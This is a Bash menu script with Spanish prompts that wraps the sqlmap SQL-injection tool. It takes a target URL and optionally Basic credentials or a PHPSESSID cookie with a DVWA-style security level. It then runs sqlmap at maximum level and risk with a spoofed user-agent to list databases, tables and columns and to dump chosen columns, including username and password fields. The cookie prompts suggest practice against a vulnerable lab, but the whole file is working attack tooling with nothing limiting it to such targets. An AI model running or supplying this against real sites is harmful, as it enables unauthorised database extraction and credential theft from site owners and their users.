#!/bin/bash

echo ""
echo "SQLMAP_MODIFIED"
echo ""


opcion="ninguna"

# Opcion0 ################################################################
function opcion0
{

echo ""
echo -e "\e[33m Ingrese la URL para ver las bases de datos\e[0m"
echo ""
read url

sqlmap -u "$url" --level=5 --risk=3 --dbs --random-agent --user-agent="nada" #user-agent se agrego

   read
   return 0

}

# Opcion1 ################################################################
function opcion1
{

echo ""
echo -e "\e[33m Ingrese la URL para ver las bases de datos y tablas\e[0m"
echo ""
read url

sqlmap -u "$url" --tables --random-agent --user-agent="nada" #user-agent se agrego

   read
   return 0

}

# Opcion2 ################################################################
function opcion2
{

echo ""
echo -e "\e[33m Ingrese la URL \e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el nombre de la base de datos  \e[0m"
echo ""
read tabla

sqlmap -u "$url" -D $tabla --tables --random-agent --user-agent="nada" #user-agent se agrego

   read
   return 0

}

# Opcion3 ################################################################
function opcion3
{

echo ""
echo -e "\e[33m Ingrese la URL \e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el nombre de la base de datos  \e[0m"
echo ""
read tabla

echo ""
echo -e "\e[33m Ingrese el nombre de la tabla  \e[0m"
echo ""
read columns

sqlmap -u "$url" -D $tabla -T $columns --columns --random-agent --user-agent="nada" #user-agent se agrego

   read
   return 0

}

# Opcion4 ################################################################
function opcion4
{

echo ""
echo -e "\e[33m Ingrese la URL \e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el nombre de la base de datos  \e[0m"
echo ""
read tabla

echo ""
echo -e "\e[33m Ingrese el nombre de la tabla  \e[0m"
echo ""
read columns

echo ""
echo -e "\e[33m  Ingrese el nombre de la columna  \e[0m"
echo ""
read detalle_column

sqlmap -u "$url" -D $tabla -T $columns -C $detalle_column --dump --random-agent --user-agent="nada" #user-agent se agrego

   read
   return 0

}

# Opcion5 ################################################################
function opcion5
{

echo ""
echo -e "\e[33m Ingrese la URL para ver las bases de datos\e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el usuario \e[0m"
echo ""
read user

echo ""
echo -e "\e[33m Ingrese el password \e[0m"
echo ""
read passwd

sqlmap -u "$url" --level=5 --risk=3 --user-agent="nada" --dbs --random-agent --auth-type="Basic" --auth-cred="$user:$passwd" #user-agent se agrego

   read
   return 0

}

# Opcion6 ################################################################
function opcion6
{

echo ""
echo -e "\e[33m Ingrese la URL para ver las DBs y Tablas\e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el nivel de seguridad ejemplo: low - medium\e[0m"
echo ""
read seguridad

echo ""
echo -e "\e[33m Ingrese la cookie \e[0m"
echo ""
read cookie

#sqlmap -u "$url" --tables --random-agent
sqlmap -u "$url" --cookie="security=$seguridad; PHPSESSID=$cookie" --user-agent="nada" --dbs

   read
   return 0

}

# Opcion7 ################################################################
function opcion7
{

echo ""
echo -e "\e[33m Ingrese la URL \e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el nivel de seguridad ejemplo: low - medium\e[0m"
echo ""
read seguridad

echo ""
echo -e "\e[33m Ingrese la cookie \e[0m"
echo ""
read cookie

echo ""
echo -e "\e[33m Ingrese el nombre de la DB que desea ver  \e[0m"
echo ""
read DB

#sqlmap -u "$url" -D $tabla --tables --random-agent
sqlmap -u "$url" --cookie="security=$seguridad; PHPSESSID=$cookie" --user-agent="nada" -D $DB --tables

   read
   return 0

}

# Opcion8 ################################################################
function opcion8
{

echo ""
echo -e "\e[33m Ingrese la URL \e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el nivel de seguridad ejemplo: low - medium\e[0m"
echo ""
read seguridad

echo ""
echo -e "\e[33m Ingrese la cookie \e[0m"
echo ""
read cookie

echo ""
echo -e "\e[33m Ingrese el nombre de la DB que desea ver  \e[0m"
echo ""
read DB

echo ""
echo -e "\e[33m Ingrese el nombre de la Tabla que desea ver  \e[0m"
echo ""
read tabla

#sqlmap -u "$url" -D $tabla -T $columns --columns --random-agent
sqlmap -u "$url" --cookie="security=$seguridad; PHPSESSID=$cookie" --user-agent="nada" -D $DB -T $tabla --columns

   read
   return 0

}

# Opcion9 ################################################################
function opcion9
{

echo ""
echo -e "\e[33m Ingrese la URL \e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el nivel de seguridad ejemplo: low - medium\e[0m"
echo ""
read seguridad

echo ""
echo -e "\e[33m Ingrese la cookie \e[0m"
echo ""
read cookie

echo ""
echo -e "\e[33m Ingrese el nombre de la DB que desea ver  \e[0m"
echo ""
read DB

echo ""
echo -e "\e[33m Ingrese el nombre de la Tabla que desea ver  \e[0m"
echo ""
read tabla

echo ""
echo -e "\e[33m  Ingrese el nombre de la columna EJEMPLO:(usuario) \e[0m"
echo ""
read users

echo ""
echo -e "\e[33m  Ingrese el nombre de la columna EJEMPLO:(passwd) \e[0m"
echo ""
read pass

#sqlmap -u "$url" -D $tabla -T $columns -C $detalle_column --dump --random-agent
sqlmap -u "$url" --cookie="security=$seguridad; PHPSESSID=$cookie" --user-agent="nada" -D $DB -T $tabla -C $users,$pass --dump

   read
   return 0

}


while [ $opcion != "10"  ]
    do

echo ""

	echo -e "+-------------------------------------------------------------------------------+"
	echo -e "\e[31m	-- MENU -- \e[0m					      			|"
	echo "|										|"
        echo -e "|\t0) Ingrese la URL para ver las DBs			        	|"
	echo -e "|\t1) Ingrese la URL para ver las DBs y Tablas		        	|"
	echo -e "|\t2) Ingrese la URL y el nombre de la base de datos para listar las tablas|"
	echo -e "|\t3) Ver info de la tabla						        |"
	echo -e "|\t4) Ver detalle de la columna - de la tabla anterior			|"
	echo -e "|\t5) Ingrese la URL para ver las bases de datos (Requiere credenciales)   |"
	echo -e "----------------------------------------------------------------------------"
	echo -e "|\e[33m	Requieren Cookies						\e[0m	|"
	echo -e "|										|"
	echo -e "|\t6) Ver DB & Tablas							|"
	echo -e "|\t7) Listar las Tablas							|"
	echo -e "|\t8) Ver info de la Tabla							|"
	echo -e "|\t9) Detalle de la columna - de la tabla anterior				|"
	echo -e "|\t10) Salir								|"
	echo -e "+-------------------------------------------------------------------------------+"
	echo -e "\e[33m \tOpcion: \c \e[0m"

read opcion

echo -e "\e[33m -------------------------------------------------------------  \e[0m"

        if [ -z $opcion ] ; then opcion="ninguna" ; fi

        case $opcion in
		"0" )
                      opcion0
  		      ;;
		"1" )
                      opcion1
  		      ;;
		"2" )
		      opcion2
		      ;;
                "3" )
                      opcion3
                      ;;
		"4" )
                      opcion4
                      ;;
                "5" )
                      opcion5
                      ;;
                "6" )
                      opcion6
                      ;;
                "7" )
                      opcion7
                      ;;
                "8" )
                      opcion8
                      ;;
                "9" )
                      opcion9
                      ;;
		"*" )
		      ;;

	esac


	/usr/bin/clear
done
